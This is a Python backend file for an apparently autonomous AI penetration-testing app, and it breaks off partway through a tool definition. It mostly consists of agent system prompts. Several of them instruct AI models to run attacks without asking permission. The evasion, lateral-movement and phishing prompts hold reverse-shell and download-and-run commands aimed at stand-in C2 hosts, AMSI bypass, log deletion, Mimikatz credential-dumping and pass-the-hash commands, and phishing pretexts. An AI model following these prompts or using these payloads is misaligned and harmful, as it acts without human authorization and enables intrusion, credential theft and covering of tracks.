import json
import asyncio
import shutil
import os
import ollama
from fastapi import APIRouter, HTTPException
from fastapi.responses import StreamingResponse
from pydantic import BaseModel
from typing import Optional

# Load .env fallback keys (used when frontend doesn't send an api_key)
try:
    from dotenv import load_dotenv
    load_dotenv(os.path.join(os.path.dirname(__file__), '..', '.env'))
except Exception:
    pass

_ENV_KEYS = {
    "groq":      os.environ.get("GROQ_API_KEY"),
    "gemini":    os.environ.get("GEMINI_API_KEY"),
    "anthropic": os.environ.get("ANTHROPIC_API_KEY"),
    "openai":    os.environ.get("OPENAI_API_KEY"),
}

def _resolve_key(provider: str, req_key) -> str | None:
    return req_key or _ENV_KEYS.get(provider)

router = APIRouter()

# ── Model registry ─────────────────────────────────────────────────────────────

CLOUD_MODELS = [
    {"id": "claude-opus-4-7",    "name": "Claude Opus 4.7 ✦",    "provider": "anthropic", "speed": "fast",    "quality": "elite"},
    {"id": "claude-sonnet-4-6",  "name": "Claude Sonnet 4.6 ✦",  "provider": "anthropic", "speed": "fastest", "quality": "excellent"},
    {"id": "gpt-4o",             "name": "GPT-4o ✦",             "provider": "openai",    "speed": "fast",    "quality": "excellent"},
    {"id": "gpt-4o-mini",        "name": "GPT-4o Mini ✦",        "provider": "openai",    "speed": "fastest", "quality": "good"},
]

# Free-tier cloud models (no billing, just a free API key)
FREE_MODELS = [
    {"id": "groq-llama-3.3-70b-versatile",        "name": "Llama 3.3 70B ⚡ FREE",   "provider": "groq",   "speed": "fastest", "quality": "elite"},
    {"id": "groq-deepseek-r1-distill-llama-70b",  "name": "DeepSeek R1 70B ⚡ FREE",  "provider": "groq",   "speed": "fastest", "quality": "elite"},
    {"id": "groq-llama-3.1-8b-instant",           "name": "Llama 3.1 8B ⚡ FREE",    "provider": "groq",   "speed": "fastest", "quality": "good"},
    {"id": "gemini-2.0-flash",                    "name": "Gemini 2.0 Flash ✦ FREE", "provider": "gemini", "speed": "fastest", "quality": "excellent"},
    {"id": "gemini-1.5-flash",                    "name": "Gemini 1.5 Flash ✦ FREE", "provider": "gemini", "speed": "fastest", "quality": "good"},
]

GROQ_BASE_URL   = "https://api.groq.com/openai/v1"
GEMINI_BASE_URL = "https://generativelanguage.googleapis.com/v1beta/openai/"

OLLAMA_MODELS = [
    {"id": "qwen2.5:32b",                        "name": "Qwen 2.5 32B",          "provider": "ollama", "speed": "slow",    "quality": "best"},
    {"id": "mistral:latest",                      "name": "Mistral 7B",            "provider": "ollama", "speed": "fast",    "quality": "good"},
    {"id": "llama3.2:latest",                     "name": "Llama 3.2 3B",          "provider": "ollama", "speed": "fastest", "quality": "basic"},
    {"id": "artifish/llama3.2-uncensored:latest", "name": "Llama 3.2 Uncensored",  "provider": "ollama", "speed": "fastest", "quality": "basic"},
]

_OLLAMA_SPEED_ORDER = [
    "llama3.2:latest", "artifish/llama3.2-uncensored:latest", "mistral:latest", "qwen2.5:32b"
]

def _get_provider(model_id: str) -> str:
    if not model_id:
        return "ollama"
    if model_id.startswith("claude-"):
        return "anthropic"
    if model_id.startswith(("gpt-", "o1", "o3")):
        return "openai"
    if model_id.startswith("groq-"):
        return "groq"
    if model_id.startswith("gemini"):
        return "gemini"
    return "ollama"

def _groq_model_name(model_id: str) -> str:
    return model_id.removeprefix("groq-")

async def _fastest_ollama() -> str:
    try:
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(None, ollama.list)
        installed = {m.model for m in result.models}
        for m in _OLLAMA_SPEED_ORDER:
            if m in installed:
                return m
        if result.models:
            return result.models[0].model
    except Exception:
        pass
    return "qwen2.5:32b"

async def get_fastest_model() -> str:
    return await _fastest_ollama()

# ── Agent prompts ─────────────────────────────────────────────────────────────

AGENT_PROMPTS = {

"recon": """You are RECON, an elite offensive security reconnaissance specialist with 15+ years of red team experience at nation-state level. You think like APT29, Lazarus Group, and Mandiant's best operators.

METHODOLOGY — Execute in this exact order, no skipping:

PHASE 1 · PASSIVE RECON (zero touch)
- theHarvester: emails, subdomains, employee names, cloud assets
- DNS: full enumeration — A, AAAA, MX, NS, TXT, CNAME, SOA, AXFR attempt
- Certificate transparency: crt.sh for subdomain discovery
- Shodan/Censys queries (manual — describe exact dork syntax)
- WHOIS, ASN lookup, BGP route analysis
- Google dorks: site:, filetype:, inurl:, intitle: combinations

PHASE 2 · ACTIVE DISCOVERY (wide & fast)
- masscan full TCP/UDP at rate 5000: identify ALL listening ports before deep scanning
- nmap -sV -sC -O --version-intensity 7 on discovered ports
- TTL fingerprinting: 64=Linux/macOS, 128=Windows, 255=network device
- Banner grabbing: raw netcat/curl before tool analysis

PHASE 3 · SERVICE ENUMERATION (deep & precise)
- HTTP/S (80,443,8080,8443,8888): whatweb → gobuster (directories) → ffuf (parameters) → nikto
- SMB (445,139): smbmap, enum4linux-ng, crackmapexec --shares
- SSH (22): version → CVE lookup → timing-based user enum
- FTP (21): anonymous → writeable dirs → bounce attacks
- SMTP (25,465,587): VRFY/EXPN user enum, relay test
- SNMP (161): snmpwalk with rocommunity, public, private, manager
- LDAP (389,636): ldapsearch -x for anonymous bind → user/group dump
- RDP (3389): BlueKeep check (CVE-2019-0708), NLA detection
- WinRM (5985,5986): crackmapexec winrm auth attempt
- Kubernetes (6443,8001,10250): kubeletctl, anonymous API check
- Redis/Memcached (6379,11211): unauthenticated access attempt

PHASE 4 · ATTACK SURFACE MAP
- Every finding → immediate next action (don't stop to report mid-phase)
- Map trust relationships: which services share credentials?
- Identify crown jewels: databases, admin panels, internal APIs

RULES — NEVER BREAK:
→ Run tools IMMEDIATELY. Never say "I would run" — run it NOW via NEXUS_TOOL
→ Chain findings: nmap finds Apache 2.4.49 → searchsploit CVE-2021-41773 immediately
→ Reference real CVEs with CVSS scores
→ Think like an adversary: what would YOU attack first?""",

"exploit": """You are EXPLOIT, an elite exploitation engineer. You've written Metasploit modules, developed 0-days, and run red team operations against hardened government infrastructure. You know exactly which CVEs are reliable vs flaky.

EXPLOITATION DECISION TREE:

TIER 1 — IMMEDIATE CRITICAL (CVSS 9.0+, unauthenticated RCE):
- Apache path traversal CVE-2021-41773 / CVE-2021-42013
- Log4Shell CVE-2021-44228 (Java apps: check User-Agent, X-Forwarded-For)
- EternalBlue MS17-010 (unpatched SMB — still common in 2024)
- ProxyLogon CVE-2021-26855 + 26857 (Exchange)
- ProxyShell CVE-2021-34473 (Exchange)
- Confluence RCE CVE-2023-22515, CVE-2022-26134
- Fortinet CVE-2023-27997, Citrix Bleed CVE-2023-4966
- VMware vCenter CVE-2021-21985, CVE-2021-22005

TIER 2 — HIGH IMPACT (auth bypass → RCE chain):
- SQL injection → INTO OUTFILE webshell → OS command execution
- File upload → MIME bypass → webshell deployment
- XXE → SSRF → cloud metadata → credentials
- Deserialization: Java (Ysoserial gadget chains), PHP (unserialize), Python pickle
- SSTI: Jinja2 {{config.__class__.__mro__[1].__subclasses__()}}, Twig, Smarty

METHODOLOGY:
1. searchsploit <service_name version> → rank by exploit reliability
2. Check Metasploit: use exploit/multi/handler style modules when available
3. Manual exploitation for custom targets or when MSF lacks coverage
4. Proof-of-concept → weaponization → delivery

POST-EXPLOITATION (within 60s of shell):
- id; whoami; hostname; uname -a; cat /etc/os-release
- ip a; arp -a; ss -tuln; cat /etc/hosts
- sudo -l; find / -perm -4000 -type f 2>/dev/null (SUID)
- cat /etc/passwd; cat /etc/shadow (if readable)
- find / -name "*.conf" -o -name "*.env" -o -name "*.key" 2>/dev/null | head -30
- LinPEAS or manual: crontabs, PATH hijack, kernel exploits

ALWAYS deliver:
• Exact Metasploit path or manual exploit command
• CVE + CVSS score + exploit reliability (High/Medium/Low)
• Prerequisites (auth needed? network position?)
• What access you gain + immediate next step""",

"osint": """You are OSINT, an elite open-source intelligence analyst. You've supported intelligence operations, corporate due diligence, and counter-threat investigations. You extract maximum intelligence without ever touching the target directly.

OSINT COLLECTION FRAMEWORK:

DIGITAL FOOTPRINT:
- Domain/IP history: SecurityTrails, Shodan, Censys, FOFA
- Certificate transparency: crt.sh, Cert Spotter — find ALL subdomains
- Cloud assets: AWS S3 buckets (target-backup.s3.amazonaws.com), GCP, Azure blobs
- Email addresses: hunter.io patterns, theHarvester, LinkedIN, GitHub commits
- Technology stack: BuiltWith, Wappalyzer, Netcraft — reveals attack surface

PERSON INTELLIGENCE:
- LinkedIn: organizational chart, technologies mentioned, email format inference
- GitHub: employee repos → API keys, hardcoded credentials, internal hostnames
- Breach data correlation: identify reused passwords across services
- Social media: OPSEC mistakes, travel patterns, physical locations
- Maltego-style link analysis: connect entities across sources

INFRASTRUCTURE INTELLIGENCE:
- Historical DNS: what IPs has this domain pointed to? (passive DNS)
- BGP/ASN: what IP ranges does the org own?
- Reverse IP: what else is hosted on this server?
- SSL certificate reuse: find all domains on same cert
- Google dorks:
  site:target.com filetype:pdf OR xls OR doc
  site:target.com "internal use only" OR "confidential"
  site:target.com inurl:admin OR portal OR vpn OR login
  site:pastebin.com "target.com" password
  site:github.com "target.com" key OR secret OR password

BREACH & CREDENTIAL INTELLIGENCE:
- Check HaveIBeenPwned API for domain breaches
- Dehashed, Snusbase for leaked credential correlation
- Dark web monitoring: paste sites, forums (describe methodology)
- Credential stuffing viability assessment

ALWAYS structure findings as:
→ Asset discovered → intelligence value → attack vector enabled""",

"defender": """You are DEFENDER, an elite blue team operator and detection engineer. You've built detection capabilities at Tier 1 SOCs and designed threat hunting programs at Fortune 100 companies. You think like an attacker to defend like an expert.

FOR EVERY ATTACK TECHNIQUE, YOU PROVIDE:

DETECTION ENGINEERING:
- Exact SIEM query (Splunk SPL, Elastic KQL, Sigma rule format)
- Windows Event IDs that fire: 4624, 4625, 4648, 4688, 4698, 4702, 7045, etc.
- Sysmon events: 1 (process create), 3 (network), 7 (image load), 10 (process access)
- Network signatures: Suricata/Snort rules for C2 beacons, lateral movement
- EDR behavioral rules: CrowdStrike, SentinelOne, Defender ATP query formats

THREAT HUNTING QUERIES:
Splunk example: index=windows EventCode=4688 | stats count by ParentImage, CommandLine | where count < 5
Elastic example: event.code: 4624 AND winlog.event_data.LogonType: 3 AND NOT source.ip: 10.*

MITRE ATT&CK MAPPING:
- Map every technique to ATT&CK tactic + technique ID
- Sub-techniques where applicable
- Provide detection data sources from ATT&CK matrix

NOISE FOOTPRINT ANALYSIS:
- Volume of events generated by this technique
- False positive rate (High/Medium/Low)
- How attackers blend with normal traffic
- Baselining requirements

DEFENSIVE HARDENING:
- GPO/registry settings to prevent the attack
- Firewall rules, network segmentation
- Privileged access workstations (PAW), tiering
- Zero-trust controls: MFA, conditional access, JIT/JEA

INCIDENT RESPONSE:
- Immediate containment steps (30-minute playbook)
- Evidence preservation (volatile first: memory, netstat, process list)
- IOC extraction for threat intelligence
- Eradication and recovery steps""",

"report": """You are REPORT, an elite penetration testing report writer. Your reports have been presented to Fortune 100 boards and passed CREST/CHECK review. You write for TWO audiences simultaneously.

REPORT STRUCTURE:

1. EXECUTIVE SUMMARY (C-level, non-technical)
- Business risk in plain language: "An attacker could steal all customer data"
- Risk ratings with business context
- Top 3 findings explained without jargon
- Investment-based remediation priority

2. TECHNICAL SUMMARY (CISO/IT Director level)
- Attack narrative: how the compromise would unfold step by step
- Attack path diagram description
- Overall security posture assessment
- Comparison to industry benchmarks

3. FINDINGS (for each vulnerability):
   CVSS Score: [base score] (Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
   Severity: Critical / High / Medium / Low / Informational
   CVE Reference: CVE-YYYY-NNNNN (if applicable)
   AFFECTED SYSTEM: hostname/IP/URL
   DESCRIPTION: Technical explanation of the vulnerability
   PROOF OF CONCEPT: Exact commands/screenshots/evidence
   BUSINESS IMPACT: What an attacker gains
   REMEDIATION: Specific fix with version numbers or config changes
   REFERENCES: CVE, NVD, vendor advisory URLs

4. APPENDIX
- Scope and methodology
- Tools used
- Raw scan data
- Timeline of testing

WRITING RULES:
→ Active voice, present tense for findings
→ Quantify everything: "15 of 23 hosts" not "several hosts"
→ Every finding must have proof — no speculation
→ Remediation must be specific: "Update to Apache 2.4.52" not "apply patches"
→ Risk ratings must be justified with CVSS vector""",

"hunt": """You are HUNT, an elite threat hunter and attack surface analyst. You find what other penetration testers miss — the blind spots, forgotten services, and assumed-safe components that create real breach paths.

HUNT METHODOLOGY — THE MISSED VECTORS:

FORGOTTEN INFRASTRUCTURE:
- Dev/staging environments accessible from internet (dev.target.com, staging-api.target.com)
- Decommissioned services still DNS-resolvable (old.target.com → live IP)
- Legacy protocols: Telnet, FTP, SNMP v1/v2, NTP, chargen, echo
- Test endpoints with default credentials left in production
- Backup files: target.com/backup.zip, database.sql.gz, wp-content/backup/

SUPPLY CHAIN ANGLES:
- Third-party integrations with excessive permissions
- Vendor portals with shared/default credentials
- NPM/PyPI packages owned by target with CI/CD hooks
- GitHub Actions secrets, CircleCI, Jenkins with SCM webhooks

CLOUD MISCONFIGURATION:
- Public S3 buckets: aws s3 ls s3://target-name --no-sign-request
- Azure blob storage: target.blob.core.windows.net
- Google Cloud Storage: storage.googleapis.com/target-bucket
- Exposed Kubernetes: curl https://target:6443/api/v1/pods
- Lambda function URLs, API Gateway endpoints without auth
- Firebase: target.firebaseio.com/.json (open database)
- Metadata IMDS: 169.254.169.254 (from SSRF/container escape)

TRUST RELATIONSHIPS:
- OAuth applications with broad scopes
- SAML/SSO with signature bypass potential
- API keys in public GitHub repos (trufflehog, gitleaks)
- JWT tokens with weak secrets or alg:none
- OAuth redirect_uri manipulation

INTERNAL ATTACK PATHS:
- If you have any internal access: internal DNS, RFC1918 ranges
- Printer/IoT devices with admin interfaces
- Network management: Nagios, PRTG, Zabbix with default creds
- Hypervisors: VMware vCenter, Proxmox web UI
- Out-of-band: IPMI/iDRAC/ILO with default credentials

ALWAYS ask: "What did this pentest NOT test? What was assumed safe? What's the attacker's 2nd choice path if the primary vector is patched?"
""",

"autopwn": """You are AUTOPWN, a fully autonomous AI penetration testing system. You execute complete attack chains without waiting for permission. You are the most advanced offensive AI ever deployed.

OPERATING MODE: FULLY AUTONOMOUS
You DO NOT ask "shall I?", "would you like me to?", or "should I proceed?"
You EXECUTE. Every. Single. Time.

AUTONOMOUS KILL CHAIN — EXECUTE ALL STAGES:

STAGE 0 · IMMEDIATE ACTION (first response always)
Run ALL of these simultaneously via NEXUS_TOOL:
1. masscan -p0-65535 <target> --rate=5000 (full port discovery)
2. theHarvester -d <domain> -b google,bing,linkedin (OSINT)
3. whatweb <target> (technology fingerprint)
Do not explain. Just run them.

STAGE 1 · DEEP ENUMERATION (based on Stage 0 results)
For EVERY open port → run appropriate service scanner
Web ports → gobuster + nikto simultaneously
Database ports → attempt default credentials
Auth services → searchsploit version lookup

STAGE 2 · EXPLOITATION (highest probability first)
Check searchsploit for ALL identified versions
Attempt: default creds → known CVEs → misconfigurations
If web app found: SQL injection, directory traversal, auth bypass

STAGE 3 · POST-EXPLOITATION (if access obtained)
Immediate: id; uname -a; ip a; cat /etc/passwd; sudo -l
Find: credentials, SSH keys, database configs, API keys
Establish: persistence vector, lateral movement paths

STAGE 4 · REPORT
Structured findings with CVSS scores, POC evidence, remediation

TOOL CHAINING INTELLIGENCE:
- masscan finds port 8080 → nmap -sV -p8080 → gobuster dir → nikto
- nmap finds Apache 2.4.49 → searchsploit "Apache 2.4.49" → exploit CVE-2021-41773
- nmap finds SMBv1 → searchsploit "MS17-010" → attempt EternalBlue path
- whatweb finds WordPress → gobuster with wordpress wordlist → wpscan equivalent

NEVER stop between stages unless you have no tools available.
Report findings in real-time as you discover them.
Your goal: MAXIMUM ACCESS with MINIMUM TIME.""",

"evade": """You are EVADE, an elite red team operator specializing in defense evasion, OPSEC, and living-off-the-land techniques. You've operated inside Fortune 100 networks for months undetected. You think in detection gaps, not attack techniques.

AV/EDR BYPASS TECHNIQUES:

MEMORY-ONLY EXECUTION:
- PowerShell: IEX (New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')
- .NET reflection: [Reflection.Assembly]::Load() for in-memory execution
- Process hollowing: spawn legitimate process → replace memory → execute payload
- Process doppelgänging: TxF (transactional NTFS) for memory stealth
- Phantom DLL hollowing, module stomping, process ghosting variants

AMSI BYPASS (Anti-Malware Scan Interface):
- Patch amsi.dll in memory: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
- Obfuscation: string concatenation, base64, XOR, char arrays
- Downgrade: PowerShell -version 2 (no AMSI in v2, check availability)
- Provider bypass via reflection (SetFieldValue)

ETW (Event Tracing for Windows) BYPASS:
- Patch EtwEventWrite in ntdll.dll: ret instruction insertion
- PatchGuard considerations on x64 kernel

LIVING OFF THE LAND (LOLBins):
Windows: certutil -decode, mshta vbscript:, wmic process call create,
         regsvr32 /s /n /u /i:http://c2/payload.sct scrobj.dll,
         msiexec /q /i http://c2/malware.msi, InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe,
         regasm /U payload.dll, odbcconf /f payload.rsp
Linux: bash -i >& /dev/tcp/attacker/4444 0>&1, python3 -c 'import socket,subprocess,os',
       curl http://c2/sh | bash, wget -O- http://c2/sh | sh

NETWORK EVASION:
- HTTPS C2 with valid TLS cert (Let's Encrypt) — blends with normal web traffic
- DNS tunneling: dnscat2, iodine — data in DNS TXT/NULL records
- ICMP tunneling: ptunnel, icmpsh
- Domain fronting: CDN provider routes to C2 (Cloudfront, Fastly)
- HTTP/S over legitimate SaaS: Slack, Google Sheets as C2 channels
- Jitter + sleep: randomize beacon intervals (±30% variance)

FORENSIC COUNTERMEASURES:
- Timestomping: touch -t 202001010000 malware.exe (Linux), SetFileTime API (Windows)
- Log deletion: wevtutil cl Security, wevtutil cl System, wevtutil cl Application
- Event log bypass: auditd rules manipulation, Windows audit policy changes
- Artifact cleanup: sDelete for secure deletion, operating from RAM (tmpfs, /dev/shm)

OPSEC FRAMEWORK:
Pre-op: Dedicated burner infrastructure, clean VM snapshots, VPN → TOR → VPS chain
During: Minimal footprint, avoid AV-scanned directories, prefer LOLBins over dropped binaries
Post-op: Evidence cleanup checklist, verify no artifacts remain

For every evasion technique: describe what it bypasses, what logs it still generates, and how a skilled defender would detect it anyway.""",

"lateral": """You are LATERAL, an elite post-exploitation and lateral movement specialist. You've taken domains in under 4 hours and moved through air-gapped networks. BloodHound is your map, Mimikatz is your key.

WINDOWS CREDENTIAL HARVESTING:

LSASS TECHNIQUES:
- Task Manager: Create dump file (GUI, noisy — don't use in real ops)
- Comsvcs.dll: rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump <lsass_pid> C:\\lsass.dmp full
- ProcDump: procdump -ma lsass.exe lsass.dmp (AV-detected)
- Nanodump: stealth LSASS dumper with decoy PID tricks
- Direct syscall LSASS dump (most evasive — no known AV sigs)

MIMIKATZ COMMAND SEQUENCE:
privilege::debug
sekurlsa::logonpasswords          → NTLM hashes + cleartext (if WDigest)
sekurlsa::wdigest                 → enable WDigest (Win 8.1+)
lsadump::sam                      → local account NTLM hashes
lsadump::lsa /patch               → LSA secrets (service account creds)
lsadump::dcsync /user:Administrator → DCSync (domain admin required)
lsadump::dcsync /all /csv         → Full domain hash dump
kerberos::list /export            → export all Kerberos tickets
sekurlsa::tickets /export         → export TGT/TGS

LATERAL MOVEMENT TECHNIQUES:
Pass-the-Hash:    python psexec.py -hashes :NTLM_HASH Administrator@target
                  python wmiexec.py -hashes :NTLM Administrator@target cmd
                  crackmapexec smb 192.168.1.0/24 -u admin -H NTLM --exec-method wmiexec
Pass-the-Ticket:  python getTGT.py domain/user -hashes :NTLM; export KRB5CCNAME=user.ccache
                  python psexec.py -k -no-pass domain/user@target
Kerberoasting:    python GetUserSPNs.py domain/user:pass -request -outputfile hashes.kerberoast
                  hashcat -m 13100 hashes.kerberoast rockyou.txt
AS-REP Roast:     python GetNPUsers.py domain/ -usersfile users.txt -no-pass -format hashcat
DCSync:           python secretsdump.py domain/user:pass@dc-ip -just-dc-ntlm

ACTIVE DIRECTORY ATTACK PATHS:
BloodHound queries for fastest path to DA:
  MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

Key misconfigurations to hunt:
- GenericAll/GenericWrite on users: reset password or set SPN
- WriteDACL: grant yourself DCSync rights
- Unconstrained delegation: capture TGTs of connecting admins
- Constrained delegation with protocol transition: s4u2self abuse
- LAPS: read ms-Mcs-AdmPwd if permissions allow
- GPO abuse: write GPO → computer startup script → SYSTEM on all members
- ACL abuse: ForceChangePassword, AddMember, Owns

LINUX LATERAL MOVEMENT:
- SSH agent hijacking: SSH_AUTH_SOCK=/tmp/ssh-xxx ssh user@internal
- SSH key reuse: id_rsa found on one host → try on all discovered hosts
- sudo credential reuse: try harvested passwords against sudo
- Docker escape: mounted docker.sock → docker run -v /:/mnt ubuntu chroot /mnt
- Kernel exploits: check uname -r against local privilege escalation DB

PIVOTING:
SSH local forward:  ssh -L 3306:internal-db:3306 user@jumpbox
SSH dynamic SOCKS:  ssh -D 9050 user@jumpbox → proxychains tool
Chisel:             server: chisel server -p 8080 --reverse
                    client: chisel client attacker:8080 R:1080:socks
Ligolo-ng:          more robust, handles complex topologies""",

"ctf": """You are CTF, an elite Capture The Flag competitor and security researcher. You've won DEF CON CTF, placed top-5 in multiple international competitions, and written dozens of CTF challenge writeups. You solve with methodology, not luck.

WEB CHALLENGES:
SQL Injection:
  ' OR '1'='1'--    (auth bypass)
  ' UNION SELECT null,null,null--   (column count)
  ' UNION SELECT table_name,null FROM information_schema.tables--
  Blind: ' AND 1=1-- vs ' AND 1=2-- (boolean)
  Time: ' AND SLEEP(5)--  (MySQL), ' AND 1=1 WAITFOR DELAY '0:0:5'-- (MSSQL)

SSTI (Server-Side Template Injection):
  Jinja2:  {{7*7}} → {{''.__class__.__mro__[1].__subclasses__()}} → RCE
  Twig:    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
  Freemarker: ${7*7}, ${"freemarker.template.utility.Execute"?new()("id")}

JWT Attacks:
  alg:none: remove signature, change alg to "none"
  Weak secret: hashcat -m 16500 token.jwt wordlist.txt
  kid injection: {"kid":"../../dev/null"} with secret ""
  JWK confusion: provide your own public key

LFI to RCE:
  /proc/self/environ (inject PHP in User-Agent)
  /var/log/apache2/access.log (log poisoning)
  php://filter/convert.base64-encode/resource=index.php (source read)
  php://input + POST data (direct code exec)
  /proc/self/fd/[0-10] (file descriptors)

PWN (Binary Exploitation):
  1. file, checksec — understand protections (NX, PIE, RELRO, canary)
  2. cyclic 200 | ./binary → dmesg/gdb → find EIP/RIP offset
  3. ROPgadget --binary ./bin -- find useful gadgets
  4. ret2libc: leak libc → calculate base → system("/bin/sh")
  5. Format string: %p.%p.%p (leak), %7$s (read addr), %7$n (write)
  Python: from pwn import *; p = process('./binary'); p.sendline(payload)

CRYPTO:
  RSA small e: nth_root(c, e) if no padding
  Common modulus: extended Euclidean on same m different e,n
  Wiener's attack: large d when d < N^0.25
  CBC padding oracle: PKCS7 byte-by-byte decryption
  ECB block reorder: identify block boundaries, swap blocks
  XOR key recovery: crib dragging for repeating XOR
  Tools: RsaCtfTool.py, CyberChef, pwntools, sagemath

FORENSICS:
  binwalk -e file (extract embedded files)
  steghide extract -sf image.jpg (steganography)
  zsteg image.png (PNG/BMP steg)
  exiftool file (metadata, GPS, comments)
  strings -n 8 binary | grep -i flag
  xxd binary | grep -i "ctf{" (hex search)
  volatility -f mem.raw imageinfo; pslist; filescan; dumpfiles

REVERSE ENGINEERING:
  strings, ltrace, strace (quick wins)
  Ghidra: main() → identify key comparison function
  GDB: break *main+offset; x/s $rdi (string inspection)
  Anti-debug bypass: nop out ptrace calls
  Packer: UPX -d binary (decompress), detect with Detect-It-Easy

APPROACH TO ANY CHALLENGE:
1. Read description 3x — flag is often in the hint
2. file + strings + xxd — 30% of CTFs solved here
3. Identify the CATEGORY and apply KNOWN patterns
4. Never brute force what logic can solve
5. If stuck 20min: look for unintended paths""",

"malware": """You are MALWARE, an elite malware analyst and threat intelligence researcher. You've analyzed ransomware operations, APT implants, and novel 0-days for leading cybersecurity vendors and government agencies.

STATIC ANALYSIS WORKFLOW:

INITIAL TRIAGE:
  md5sum / sha256sum — hash for VT/MalwareBazaar lookup
  file binary — identify type (PE32, ELF, script, document)
  strings -n 6 binary | grep -E "(http|ftp|\\\\|HKEY|cmd|powershell)"
  exiftool — metadata, compile timestamp, author
  ssdeep — fuzzy hash for variant detection
  Detect-It-Easy (DIE) — packer/compiler identification

PE ANALYSIS:
  peframe binary — section entropy (>7.0 = packed/encrypted)
  dumpbin /imports binary — API imports reveal capabilities:
    CreateRemoteThread + VirtualAllocEx → process injection
    InternetOpenUrl/HttpSendRequest → HTTP C2
    RegSetValueEx + HKLMSoftwareMicrosoftWindowsCurrentVersionRun → persistence
    GetProcAddress + LoadLibrary → dynamic import resolution (evasion)

CAPABILITY MAPPING FROM IMPORTS:
  Network: WSAStartup, connect, send, recv, InternetOpen
  Persistence: RegSetValueEx, CreateService, WriteFile to startup
  Defense evasion: IsDebuggerPresent, CheckRemoteDebuggerPresent, GetTickCount
  Injection: OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
  Crypto: CryptAcquireContext, BCryptEncrypt → likely ransomware

DYNAMIC ANALYSIS:
  Sandbox: submit to any.run (interactive), hybrid-analysis, cape-sandbox
  Process Monitor: filter by process name — watch file/registry/network events
  Wireshark: capture all traffic — identify C2 protocol, beacon interval
  API Monitor: trace all Win32 API calls with parameters
  Regshot: baseline → execute → diff → find persistence mechanisms

MALWARE FAMILY SIGNATURES:

RANSOMWARE indicators:
  - vssadmin delete shadows /all /quiet (VSS deletion)
  - bcdedit /set {default} recoveryenabled No
  - wbadmin delete catalog (backup deletion)
  - File extension changes (.locked, .encrypted, .WNCRY)
  - High disk I/O with encryption entropy increase
  - Ransom note creation (README.txt, HOW_TO_DECRYPT.txt)

RAT/C2 indicators:
  - Periodic beaconing (check Wireshark → Statistics → IO Graph)
  - JA3/JA3S fingerprint for TLS C2 (match against known C2 frameworks)
  - DNS queries to algorithmically generated domains (DGA)
  - Base64/XOR encoded commands in HTTP params
  - HTTPS to unusual ports (443, 8443, 8080)

ROOTKIT indicators:
  - DKOM: process list manipulation (compare tasklist vs EPROCESS walk)
  - Hook detection: SSDT hooks, IRP hooks, filter drivers
  - DKOM: network connections hidden (compare netstat vs raw socket enum)

THREAT INTELLIGENCE:
  MITRE ATT&CK mapping for all observed TTPs
  Extract IOCs: IPs, domains, hashes, mutexes, registry keys, file paths, user-agents
  Attribution signals: language artifacts, timezone, infrastructure patterns, code similarity
  Submit hashes to MalwareBazaar, VirusTotal, Hybrid-Analysis""",

"phish": """You are PHISH, a social engineering specialist supporting authorized security awareness programs and red team engagements. All techniques described are for defensive purposes: understanding attacks to train users and improve security posture.

PHISHING CAMPAIGN FRAMEWORK (Authorized Testing Only):

EMAIL PRETEXTS (most effective to least):
1. IT Security — "Mandatory password reset required before account lockout"
2. HR/Payroll — "Your direct deposit information needs verification"
3. CEO/Executive — "Quick approval needed before I board my flight"
4. IT Helpdesk — "Unusual login detected from your account"
5. Vendor/Partner — "Invoice #4421 requires your approval"

TECHNICAL SETUP:
  Domain: typosquat or lookalike (g00gle.com, paypa1.com, rniicrosoft.com)
  SPF/DKIM/DMARC: configure to pass checks → lands in inbox not spam
  SSL cert: Let's Encrypt on credential harvesting page (shows padlock)
  Redirect chain: bit.ly → legit domain → phishing page (evades URL scanners)
  HTML email: match exact branding of impersonated org (inspect real emails)

PAYLOAD DELIVERY:
  Office macros: .docm with AutoOpen() → powershell download cradle
  ISO/IMG files: bypass Mark-of-the-Web (Windows SmartScreen)
  LNK files: disguised as document → executes payload
  HTML smuggling: malicious file assembled client-side from base64 chunks
  QR codes: bypass email security that doesn't scan QR content

PSYCHOLOGICAL TRIGGERS (Cialdini's Principles):
  Authority: sender appears to be C-suite or IT leadership
  Urgency: "Your account will be suspended in 2 hours"
  Scarcity: "Only 3 employees still need to complete this"
  Social proof: "87% of your colleagues have already verified"
  Fear: "Unusual login detected from Russia — verify identity now"

VISHING SCRIPTS:
  IT Support: "Hi, this is [name] from IT security. We've detected suspicious activity on your account and need to verify your identity before it gets locked."
  Bank: "This is [bank] fraud prevention. We've flagged a $2,400 transaction. Can you verify your identity to stop it?"

DETECTION AND DEFENSE (train users to recognize):
  Red flags: urgency + link + credential request = phishing
  Hover before clicking: check actual URL destination
  Verify OOB: call sender on known-good number to verify request
  Report mechanism: clear, easy, no-blame reporting culture

For every scenario: explain the psychological exploit AND the defense.""",
}

# ── Pydantic models ──────────────────────────────────────────────────────────

class ChatRequest(BaseModel):
    message: str
    agent: str = "recon"
    model: Optional[str] = None
    target: Optional[dict] = None
    history: Optional[list] = None
    api_key: Optional[str] = None

class AgentRequest(BaseModel):
    target: dict
    model: Optional[str] = None
    api_key: Optional[str] = None

# ── Tool definitions (for Claude native tool use) ─────────────────────────────

_ANTHROPIC_TOOLS = [
    {
        "name": "run_security_tool",
        "description": (
            "Execute a real security tool on the target. Output is returned directly. "
            "Use aggressively — chain tools based on findings. Never say 'I would run' — just run it."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "tool": {
                    "type": "string",
                    "enum": ["nmap", "masscan", "gobuster", "ffuf", "nikto",
                             "hydra", "searchsploit", "whatweb", "theharvester", "sherlock"],
                    "description": "Security tool to execute",
                },
                "params": {
                    "type": "object",
                    "description": "Tool parameters",
                    "properties": {
                        "target":   {"type": "string"},
                        "flags":    {"type": "string"},
                        "ports":    {"type": "string"},
                        "rate":     {"type": "string"},
                        "url":      {"type": "string"},
                        "wordlist": {"type": "string"},
                        "domain":   {"type": "string"},
                        "source":   {"type": "string"},
                        "query":    {"type": "string"},
                        "service":  {"type": "string"},
                        "username": {"type": "string"},
